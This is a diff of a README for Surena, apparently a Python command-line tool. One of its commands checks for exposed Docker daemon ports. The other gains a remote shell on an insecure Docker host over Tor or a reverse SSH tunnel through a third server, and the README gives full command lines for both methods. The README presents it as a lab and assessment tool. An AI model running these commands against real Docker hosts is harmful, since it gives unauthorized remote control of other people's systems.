@@ -1,24 +1,52 @@
 # Surena
 
-Surena is a tool designed to help you assess whether your Docker daemon has vulnerabilities. It utilizes Click, a Python CLI library, for its development.
+Surena is a tool developed to assess vulnerabilities in Docker daemons when their ports are exposed to a TCP network. It is developed using Click, a Python CLI library, and the Docker SDK for Python. Surena demonstrates how a hacker can gain shell access from an insecure Docker host using two methods: Tor Network and SSH Reverse Tunneling.
 
-With Surena, you can determine if your Docker daemon is vulnerable. Additionally, it illustrates potential security risks when Docker daemons expose ports insecurely. We've also written an article on Medium explaining how Surena works. You can access the article [here](#).
+To explain how Surena works and how to use these methods, we have written an article on Medium that you can read by following this link: Medium Article.
 
 ## Installation
 
-You can install Surena from PyPI by executing the following command:
+You can install Surena from PyPI by running the following command:
 
 ```bash
 pip install surena
 ```
 
-Once installed, you can access its help feature using the following command. Surena is user-friendly due to its utilization of the Click library:
+Once installed, you can run Surena using the following commands in your terminal. To view the available commands and options, you can run following command:
 
 ```bash
 surena --help
 ```
 
-Note: Surena is intended for lab use and for understanding whether your Docker daemon is secure or insecure. DO NOT USE SURENA FOR MALICIOUS ACTIVITIES.
+Surena has two command those are "is-docker-host" and "get-docker-host".
 
-If Surena proves helpful for you or your organization, consider supporting us by donating Dogecoin to the following wallet:
-DRizEG8R6wW2cW5MNEAnERMMEMq6wupQMA
+### is-docker-host command
+"is-docker-host" command is used for checking the Docker daemon's port is accessible from the network or not. for understanding its options you can run like following command:
+```bash
+poetry run surena is-docker-host --help
+```
+for instance you can run this command with below options:
+```bash
+poetry run surena is-docker-host --docker-host-address $DOCKER_HOST_IP --docker-host-port $DOCKER_HOST_PORT
+```
+
+### get-docker-host command
+"get-docker-host" command is used for gain shell access from docker daemon with using two method. for understanding its options you can run like following command:
+
+```bash
+surena get-docker-host --help
+```
+
+for instance for gain shell access by usinf Tor Network method,you can run this command with below options:
+
+```bash
+surena get-docker-host --docker-host-address $DOCKER_HOST_IP --docker-host-port $DOCKER_HOST_PORT --access-method tor
+```
+
+for instance for gain shell access by using Reverse SSH Tunneling method, you can run this command with below options:
+
+```bash
+surena get-docker-host --docker-host-address $DOCKER_HOST_IP --docker-host-port $DOCKER_HOST_PORT --access-method reverse-ssh --ssh-server-address $THIRD_SERVER_IP --ssh-server-username $THIRD_SERVER_USERNAME --ssh-server-password $THIRD_SERVER_PASSWORD --ssh-server-port $THIRD_SERVER_SSH_PORT
+```
+
+Please note: Surena is intended for lab use and for understanding whether your Docker daemon is secure or insecure. DO NOT USE SURENA FOR MALICIOUS ACTIVITIES.
